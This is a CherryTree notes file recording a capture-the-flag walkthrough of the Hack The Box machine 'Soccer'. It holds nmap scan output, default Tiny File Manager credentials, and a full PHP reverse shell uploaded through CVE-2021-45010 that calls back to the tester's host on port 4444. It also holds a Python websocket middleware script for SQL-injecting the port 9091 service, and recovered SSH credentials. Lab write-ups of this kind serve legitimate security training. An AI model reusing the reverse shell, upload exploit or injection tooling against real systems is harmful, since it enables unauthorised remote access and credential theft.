<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="Soccer" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675345313" ts_lastsave="1675476272">
    <rich_text>IP :10.10.11.194
Hostname: soccer.htb
OS: Ubuntu

Credentials:




Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Nmap" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675345448" ts_lastsave="1675345484">
      <rich_text>

└─$ sudo ./nmapScanTCP.sh 10.10.11.194 HTB/Soccer/nmap/nmapAllTCP
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
           
           
           
           </rich_text>
      <codebox char_offset="68" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">[sudo] password for kali: 
USAGE: ./nmapScanTCP.sh &lt;inputip&gt; &lt;outputfile&gt;

the ports found are: 22,80,9091
HTB/Soccer/nmap/nmapAllTCP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 08:42 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating Ping Scan at 08:42
Scanning 10.10.11.194 [4 ports]
Completed Ping Scan at 08:42, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:42
Completed Parallel DNS resolution of 1 host. at 08:42, 0.00s elapsed
Initiating SYN Stealth Scan at 08:42
Scanning 10.10.11.194 (10.10.11.194) [3 ports]
Discovered open port 80/tcp on 10.10.11.194
Discovered open port 9091/tcp on 10.10.11.194
Discovered open port 22/tcp on 10.10.11.194
Completed SYN Stealth Scan at 08:42, 0.09s elapsed (3 total ports)
Initiating Service scan at 08:42
Scanning 3 services on 10.10.11.194 (10.10.11.194)
Completed Service scan at 08:42, 14.98s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.194 (10.10.11.194)
Retrying OS detection (try #2) against 10.10.11.194 (10.10.11.194)
Initiating Traceroute at 08:42
Completed Traceroute at 08:42, 0.04s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:42
Completed Parallel DNS resolution of 1 host. at 08:42, 0.01s elapsed
NSE: Script scanning 10.10.11.194.
Initiating NSE at 08:42
Completed NSE at 08:42, 1.64s elapsed
Initiating NSE at 08:42
Completed NSE at 08:42, 0.45s elapsed
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Nmap scan report for 10.10.11.194 (10.10.11.194)
Host is up (0.036s latency).                                                                                                                                 
                                                                                                                                                             
PORT     STATE SERVICE         VERSION                                                                                                                       
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                  
| ssh-hostkey:                                                                                                                                               
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)                                                                                                              
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)                                                                                                             
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)                                                                                                           
80/tcp   open  http            nginx 1.18.0 (Ubuntu)                                                                                                         
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                  
|_http-title: Did not follow redirect to http://soccer.htb/                                                                                                  
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
9091/tcp open  xmltec-xmlmail?                                                                                                                               
| fingerprint-strings:                                                                                                                                       
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:                                                                
|     HTTP/1.1 400 Bad Request                                                                                                                               
|     Connection: close                                                                                                                                      
|   GetRequest:                                                                                                                                              
|     HTTP/1.1 404 Not Found                                                                                                                                 
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 02 Feb 2023 13:42:41 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;title&gt;Error&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 02 Feb 2023 13:42:41 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;title&gt;Error&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 02 Feb 2023 13:42:42 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;title&gt;Error&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=2/2%Time=63DBBDCC%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Thu,\x2002\x20Feb\x202023\x2013:42:41\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=
SF:\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/h
SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Thu,\x2002\x20Feb\x202023\x2013:42:41\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;met
SF:a\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca
SF:nnot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Thu,\x
SF:2002\x20Feb\x202023\x2013:42:42\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;
SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"ut
SF:f-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x
SF:20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 12.447 days (since Fri Jan 20 21:59:06 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.86 ms 10.10.14.1 (10.10.14.1)
2   34.03 ms 10.10.11.194 (10.10.11.194)

NSE: Script Post-scanning.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds
           Raw packets sent: 78 (6.666KB) | Rcvd: 59 (5.610KB)</codebox>
    </node>
    <node name="Port 80/http" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675469043" ts_lastsave="1675474045">
      <rich_text link="webs http://soccer.htb/tiny/">http://soccer.htb/tiny/</rich_text>
      <rich_text>
on gobustering we find the following

on checking the docs in the tine file manager we see the following
</rich_text>
      <rich_text link="webs https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management">https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management</rich_text>
      <rich_text>

which tells us default username and password



after researching a lil i find this vulnerability

</rich_text>
      <rich_text link="webs https://www.exploit-db.com/exploits/50828">https://www.exploit-db.com/exploits/50828</rich_text>
      <rich_text>

I tried it partially worked but couldnt get the RCE

on reading i see that we can upload the file

</rich_text>
      <rich_text link="webs https://nvd.nist.gov/vuln/detail/CVE-2021-45010">https://nvd.nist.gov/vuln/detail/CVE-2021-45010</rich_text>
      <rich_text>

So i </rich_text>
      <rich_text link="webs http://soccer.htb/tiny/tinyfilemanager.php?p=&amp;upload">http://soccer.htb/tiny/tinyfilemanager.php?p=&amp;upload</rich_text>
      <rich_text>

uploaded on the above link the following  payload from php rev shell payload generater


but the folder wasnt writable after going through it i realised i can only upload it in the upload folder here
</rich_text>
      <rich_text style="italic"> / </rich_text>
      <rich_text link="webs http://soccer.htb/tiny/tinyfilemanager.php?p=tiny">tiny</rich_text>
      <rich_text style="italic"> / </rich_text>
      <rich_text link="webs http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads">uploads</rich_text>
      <rich_text>

once uploaded
visit the following
</rich_text>
      <rich_text link="webs http://soccer.htb/tiny/uploads/phprevshell.php">http://soccer.htb/tiny/uploads/phprevshell.php</rich_text>
      <rich_text>
 and get the rev shell
 </rich_text>
      <codebox char_offset="257" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">admin/admin@123 worked</codebox>
      <codebox char_offset="649" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
  &lt;?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.10.15.14';  // You have changed this
  $port = 4444;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?&gt; 
  </codebox>
    </node>
    <node name="priv esc" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675474064" ts_lastsave="1675476525">
      <rich_text>once we get the foot hold lets upgrade the shell

once done check the following

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

so adding it to /etc/hosts

going there we see we could register and login
 
 i see websocket connection

to try sql map i used the following script 

 


we got the following creds:

player@soccer.htb PlayerOftheMatch2022



</rich_text>
      <codebox char_offset="81" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">www-data@soccer:/$ cat /etc/nginx/sites-enabled/soc-player.htb 
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
</codebox>
      <codebox char_offset="236" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
 ws = create_connection(ws_server)
 # If the server returns a response on connect, use below line 
 #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
 
 # For our case, format the payload in JSON
 message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
 data = '{"id":"%s"}' % message

 ws.send(data)
 resp = ws.recv()
 ws.close()

 if resp:
  return resp
 else:
  return ''

def middleware_server(host_port,content_type="text/plain"):

 class CustomHandler(SimpleHTTPRequestHandler):
  def do_GET(self) -&gt; None:
   self.send_response(200)
   try:
    payload = urlparse(self.path).query.split('=',1)[1]
   except IndexError:
    payload = False
    
   if payload:
    content = send_ws(payload)
   else:
    content = 'No parameters specified!'

   self.send_header("Content-type", content_type)
   self.end_headers()
   self.wfile.write(content.encode())
   return

 class _TCPServer(TCPServer):
  allow_reuse_address = True

 httpd = _TCPServer(host_port, CustomHandler)
 httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
 middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
 pass
</codebox>
      <codebox char_offset="311" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" player@soccer.htb </codebox>
    </node>
  </node>
</cherrytree>
